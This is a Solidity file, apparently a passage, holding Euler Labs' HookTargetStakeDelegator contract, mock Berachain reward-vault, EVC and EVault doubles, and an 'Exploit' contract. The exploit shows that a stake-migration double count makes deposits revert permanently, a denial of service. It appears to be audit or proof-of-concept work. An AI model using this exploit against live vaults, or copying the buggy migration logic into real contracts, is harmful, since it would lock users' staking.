    /// @param _amount Amount of tokens to burn
    function burn(uint256 _amount) external onlyOwner {
        _burn(owner(), _amount);
    }
}

/// @title HookTargetStakeDelegator
/// @custom:security-contact security@euler.xyz
/// @author Euler Labs (https://www.eulerlabs.com/)
/// @notice Hook target that automatically delegate stakes representation of EVault shares in Berachain's reward vault
/// system. This hook target uses a batched processing approach where it:
/// 1. Tracks accounts affected by EVault operations by snapshotting their initial share balances
/// 2. Processes all balance changes at the end of the EVC checks deferred context
/// 3. Mints/burns share representation tokens and updates stake delegations based on the net balance changes
/// This allows EVault users to participate in Berachain's Proof of Liquidity (POL) system while still being able
/// to use their shares as collateral.
contract HookTargetStakeDelegator is Ownable, IHookTarget {
    using EnumerableSet for EnumerableSet.AddressSet;

    /// @notice Reference to the Ethereum Vault Connector contract
    /// @dev Used to resolve account ownership for proper reward delegation
    IEVC public immutable evc;

    /// @notice Reference to the EVault this hook target is attached to
    /// @dev Source of share balances and operations that trigger staking
    IEVault public immutable eVault;

    /// @notice The token representing EVault shares
    /// @dev Minted/burned in sync with EVault operations and automatically staked
    ERC20ShareRepresentation public immutable erc20;

    /// @notice Reference to the Berachain reward vault where shares are delegate staked
    /// @dev Handles the actual staking of shares and reward distribution
    IRewardVault public immutable rewardVault;

    /// @notice Set of accounts that have been affected by operations in the current EVC checks deferred context
    /// @dev Used to track which accounts need their balances processed in the checkVaultStatus hook
    EnumerableSet.AddressSet internal touchedAccounts;

    /// @notice Mapping of initial share balances for accounts affected in the current EVC checks deferred context
    /// @dev Used to calculate net balance changes when processing the EVC checks deferred context
    mapping(address account => uint256 amount) internal initialBalances;

    /// @notice Creates a new HookTargetStakeDelegator
    /// @param _eVault The EVault this hook target will be attached to
    /// @param _rewardVaultFactory Factory contract that creates reward vaults for stake tokens
    constructor(address _eVault, address _rewardVaultFactory) Ownable(_eVault) {
        evc = IEVC(IEVault(_eVault).EVC());
        eVault = IEVault(_eVault);
        erc20 = new ERC20ShareRepresentation(_eVault);
        rewardVault = IRewardVault(IRewardVaultFactory(_rewardVaultFactory).predictRewardVaultAddress(address(erc20)));
        erc20.approve(address(rewardVault), type(uint256).max);
    }

    /// @notice Intercepts EVault deposit operations to track affected accounts
    /// @param receiver The address that will receive shares and needs balance tracking
    /// @return Always returns 0 (irrelevant for hook targets)
    function deposit(uint256, address receiver) external onlyOwner returns (uint256) {
        _snapshotAccount(receiver);
        return 0;
    }

    /// @notice Intercepts EVault mint operations to track affected accounts
    /// @param receiver The address that will receive shares and needs balance tracking
    /// @return Always returns 0 (irrelevant for hook targets)
    function mint(uint256, address receiver) external onlyOwner returns (uint256) {
        _snapshotAccount(receiver);
        return 0;
    }

    /// @notice Intercepts EVault withdraw operations to track affected accounts
    /// @param owner The address whose balance will change and needs tracking
    /// @return Always returns 0 (irrelevant for hook targets)
    function withdraw(uint256, address, address owner) external onlyOwner returns (uint256) {
        _snapshotAccount(owner);
        return 0;
    }

    /// @notice Intercepts EVault redeem operations to track affected accounts
    /// @param owner The address whose balance will change and needs tracking
    /// @return Always returns 0 (irrelevant for hook targets)
    function redeem(uint256, address, address owner) external onlyOwner returns (uint256) {
        _snapshotAccount(owner);
        return 0;
    }

    /// @notice Intercepts EVault skim operations to track affected accounts
    /// @param receiver The address that will receive shares and needs balance tracking
    /// @return Always returns 0 (irrelevant for hook targets)
    function skim(uint256, address receiver) external onlyOwner returns (uint256) {
        _snapshotAccount(receiver);
        return 0;
    }

    /// @notice Intercepts EVault repayWithShares operations to track affected accounts
    /// @return shares Always returns 0 (irrelevant for hook targets)
    /// @return debt Always returns 0 (irrelevant for hook targets)
    function repayWithShares(uint256, address) external onlyOwner returns (uint256 shares, uint256 debt) {
        _snapshotAccount(_eVaultCaller());
        return (0, 0);
    }

    /// @notice Intercepts EVault transfer operations to track affected accounts
    /// @param to The address receiving shares that needs balance tracking
    /// @return Always returns false (irrelevant for hook targets)
    function transfer(address to, uint256) external onlyOwner returns (bool) {
        _snapshotAccount(_eVaultCaller());
        _snapshotAccount(to);
        return false;
    }

    /// @notice Intercepts EVault transferFrom operations to track affected accounts
    /// @param from The address sending shares that needs balance tracking
    /// @param to The address receiving shares that needs balance tracking
    /// @return Always returns false (irrelevant for hook targets)
    function transferFrom(address from, address to, uint256) external onlyOwner returns (bool) {
        _snapshotAccount(from);
        _snapshotAccount(to);
        return false;
    }

    /// @notice Intercepts EVault transferFromMax operations to track affected accounts
    /// @param from The address sending shares that needs balance tracking
    /// @param to The address receiving shares that needs balance tracking
    /// @return Always returns false (irrelevant for hook targets)
    function transferFromMax(address from, address to) external onlyOwner returns (bool) {
        _snapshotAccount(from);
        _snapshotAccount(to);
        return false;
    }

    /// @notice Intercepts EVault convertFees operations to track affected accounts
    function convertFees() external onlyOwner {
        (address protocolReceiver,) = ProtocolConfig(eVault.protocolConfigAddress()).protocolFeeConfig(address(eVault));
        address governorReceiver = eVault.feeReceiver();

        _snapshotAccount(protocolReceiver);
        _snapshotAccount(governorReceiver);
    }

    /// @notice Processes all balance changes for accounts affected in the current EVC checks deferred context
    /// @dev Called at the end of the EVC checks deferred context to:
    /// 1. Calculate net balance changes for all affected accounts
    /// 2. Mint share representation tokens and delegate stake for balance increases
    /// 3. Withdraw delegated stake and burn tokens for balance decreases
    /// 4. Reset tracking state for the next EVC checks deferred context
    /// @return Always returns 0 (irrelevant for hook targets)
    function checkVaultStatus() external onlyOwner returns (bytes4) {
        address[] memory accounts = touchedAccounts.values();

        for (uint256 i = 0; i < accounts.length; ++i) {
            address account = accounts[i];
            uint256 initialBalance = initialBalances[account];
            uint256 currentBalance = eVault.balanceOf(account);

            if (currentBalance > initialBalance) {
                uint256 amount = currentBalance - initialBalance;
                erc20.mint(amount);
                _delegateStake(account, amount);
            } else if (currentBalance < initialBalance) {
                uint256 amount = initialBalance - currentBalance;
                erc20.burn(_delegateWithdraw(account, amount));
            }

            initialBalances[account] = 0;
            touchedAccounts.remove(account);
        }

        return 0;
    }

    /// @inheritdoc IHookTarget
    /// @dev This function returns the expected magic value only if the reward vault is already deployed.
    function isHookTarget() external view override returns (bytes4) {
        if (address(rewardVault).code.length == 0) return 0;
        return this.isHookTarget.selector;
    }

    /// @notice Retrieves the caller address in the context of the calling EVault.
    /// @return _caller The address of the account on which given EVault operation is performed.
    function _eVaultCaller() internal pure returns (address _caller) {
        assembly {
            _caller := shr(96, calldataload(sub(calldatasize(), 20)))
        }
    }

    /// @notice Records an account's current balance before it's affected by an operation
    /// @dev Only snapshots the first time an account is touched in an EVC checks deferred context
    /// @param account The account to snapshot
    function _snapshotAccount(address account) internal {
        if (touchedAccounts.add(account)) {
            initialBalances[account] = eVault.balanceOf(account);
        }
    }

    /// @notice Delegates stake to an account's EVC owner and handles stake migration between account and its EVC owner
    /// @dev Handles stake delegation and migration with the following considerations:
    /// - Stakes are always delegated to the EVC owner of the account, not the account itself
    /// - If an account has no registered EVC owner, the stake is delegated to the account directly
    /// - When an account first receives stake, its EVC owner might not be registered yet, causing the stake to be
    /// delegated directly to the account. Once the owner is registered and is different from the account, we need to
    /// migrate this stake.
    /// @param account The account whose EVC owner will receive the delegated stake
    /// @param amount The amount of shares to delegate stake
    function _delegateStake(address account, uint256 amount) internal {
        address owner = evc.getAccountOwner(account);
        rewardVault.delegateStake(owner == address(0) ? account : owner, amount + _migrateStake(owner, account));
    }

    /// @notice Withdraws delegated stake from an account and handles stake migration between account and its EVC owner
    /// @dev Handles stake migration and withdrawal with the following considerations:
    /// - When an account first receives stake, its EVC owner might not be registered yet, causing the stake to be
    /// delegated directly to the account. Once the owner is registered and is different from the account, we need to
    /// migrate this stake.
    /// - The amount to withdraw is capped by the available stake because the hook target might not have been installed
    /// since the EVault's creation, meaning not all shares are necessarily staked.
    /// @param account The account whose stake (or whose EVC owner's stake) should be withdrawn
    /// @param amount The requested amount of stake to withdraw
    /// @return The actual amount of stake withdrawn (may be less than requested if insufficient stake)
    function _delegateWithdraw(address account, uint256 amount) internal returns (uint256) {
        address owner = evc.getAccountOwner(account);

        _migrateStake(owner, account);

        if (owner == address(0)) owner = account;

        uint256 stake = rewardVault.getDelegateStake(owner, address(this));

        // Cap withdrawal at available stake (might be less than shares if hook target wasn't installed from EVault
        // creation)
        if (amount > stake) {
            amount = stake;
        }

        if (amount > 0) {
            rewardVault.delegateWithdraw(owner, amount);
        }

        return amount;
    }

    /// @notice Migrates any stake delegated directly to an account to its registered EVC owner
    /// @dev If an account has a registered owner different from itself, this function migrates any stake that was
    /// delegated directly to the account (from before owner registration) to the owner
    /// @param owner The registered EVC owner address of the account
    /// @param account The account address to check and migrate stake from
    /// @return The amount of stake that was migrated from the account to its owner
    function _migrateStake(address owner, address account) internal returns (uint256) {
        uint256 stake;
        if (owner != address(0) && owner != account) {
            stake = rewardVault.getDelegateStake(account, address(this));

            if (stake > 0) {
                rewardVault.delegateWithdraw(account, stake);
                rewardVault.delegateStake(owner, stake);
            }
        }

        return stake;
    }
}

// ==== Faithful external-boundary doubles ====
interface IHookDrive {
    function deposit(uint256, address receiver) external returns (uint256);
    function checkVaultStatus() external returns (bytes4);
}

// Faithful Berachain POL RewardVault delegate-staking accounting: delegateStake
// PULLS the stake token via transferFrom (like the real _stake), delegateWithdraw
// returns it, getDelegateStake reads the per-(account,delegate) ledger.
contract MockRewardVault {
    address public immutable stakeToken;
    mapping(address => mapping(address => uint256)) internal _stakedByDelegate;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address _stakeToken) { stakeToken = _stakeToken; }

    function delegateStake(address account, uint256 amount) external {
        require(account != address(0), "zero");
        require(msg.sender != account, "not delegate");
        _stakedByDelegate[account][msg.sender] += amount;
        balanceOf[account] += amount;
        totalSupply += amount;
        IERC20(stakeToken).transferFrom(msg.sender, address(this), amount); // reverts if short
    }

    function delegateWithdraw(address account, uint256 amount) external {
        require(msg.sender != account, "not delegate");
        uint256 s = _stakedByDelegate[account][msg.sender];
        require(s >= amount, "insufficient delegate stake");
        _stakedByDelegate[account][msg.sender] = s - amount;
        balanceOf[account] -= amount;
        totalSupply -= amount;
        IERC20(stakeToken).transfer(msg.sender, amount);
    }

    function getDelegateStake(address account, address delegate) external view returns (uint256) {
        return _stakedByDelegate[account][delegate];
    }
}

contract MockRewardVaultFactory {
    bytes32 internal constant SALT = bytes32(uint256(1));

    function predictRewardVaultAddress(address stakingToken) public view returns (address) {
        bytes32 initHash = keccak256(abi.encodePacked(type(MockRewardVault).creationCode, abi.encode(stakingToken)));
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), SALT, initHash)))));
    }

    function createRewardVault(address stakingToken) external returns (address) {
        return address(new MockRewardVault{salt: SALT}(stakingToken));
    }
}

contract MockEVC {
    mapping(address => address) internal _owner;
    function getAccountOwner(address account) external view returns (address) { return _owner[account]; }
    function setAccountOwner(address account, address owner) external { _owner[account] = owner; }
}

contract MockEVault {
    address public immutable EVC;
    string public name = "Euler Vault: TEST";
    string public symbol = "eTEST";
    mapping(address => uint256) public balanceOf;
    function protocolConfigAddress() external view returns (address) { return address(0); }
    function feeReceiver() external view returns (address) { return address(0); }

    constructor(address _evc) { EVC = _evc; }
    function setBalance(address account, uint256 bal) external { balanceOf[account] = bal; }
    function snapshotDeposit(address hook, uint256 amount, address receiver) external {
        IHookDrive(hook).deposit(amount, receiver);
    }
    function runCheck(address hook) external { IHookDrive(hook).checkVaultStatus(); }
}

// ==== The exploit ====
contract Exploit {
    MockEVC public evc;
    MockEVault public eVault;
    MockRewardVaultFactory public factory;
    HookTargetStakeDelegator public hook;
    MockRewardVault public rv;
    ERC20ShareRepresentation public erc20;

    address internal constant OWNER = address(0xA11CE);   // the EVC owner
    address internal constant ACCOUNT = address(0xACC0);  // its sub-account
    uint256 internal constant S = 100e18; // stake first delegated directly to ACCOUNT
    uint256 internal constant A = 40e18;  // new shares deposited later (triggers migration)

    bool public migrationReverted;
    uint256 public doubleCountedAmount;

    constructor() {
        evc = new MockEVC();
        eVault = new MockEVault(address(evc));
        factory = new MockRewardVaultFactory();
        hook = new HookTargetStakeDelegator(address(eVault), address(factory));
        factory.createRewardVault(address(hook.erc20()));
        rv = MockRewardVault(address(hook.rewardVault()));
        erc20 = hook.erc20();
    }

    function run() external payable {
        // Phase 1: ACCOUNT receives S shares while its EVC owner is unregistered.
        // getAccountOwner(ACCOUNT)==0 -> stake delegated directly to ACCOUNT.
        eVault.snapshotDeposit(address(hook), S, ACCOUNT);
        eVault.setBalance(ACCOUNT, S);
        eVault.runCheck(address(hook)); // mint S erc20, delegateStake(ACCOUNT, S)
        require(rv.getDelegateStake(ACCOUNT, address(hook)) == S, "setup phase1");

        // Phase 2: the EVC owner registers.
        evc.setAccountOwner(ACCOUNT, OWNER);

        // Phase 3: ACCOUNT receives A more shares -> _delegateStake migration path.
        // _migrateStake already re-stakes S to OWNER, then the buggy outer call runs
        // delegateStake(OWNER, A + S) -> needs A + S share tokens but only A exist ->
        // transferFrom reverts. The migrated S is counted twice (A + 2S total).
        eVault.snapshotDeposit(address(hook), A, ACCOUNT);
        eVault.setBalance(ACCOUNT, S + A);
        try eVault.runCheck(address(hook)) {
            migrationReverted = false;
        } catch {
            migrationReverted = true;
        }

        // HARM: the migration deposit is permanently DoS'd by the double count.
        require(migrationReverted, "expected migration DoS from double count");
        doubleCountedAmount = S; // the migrated stake the buggy code adds a second time

        // Fully reverted -> OWNER never credited, ACCOUNT stake stranded/unchanged.
        require(rv.getDelegateStake(OWNER, address(hook)) == 0, "owner must not be credited");
        require(rv.getDelegateStake(ACCOUNT, address(hook)) == S, "account stake unchanged");
    }
}

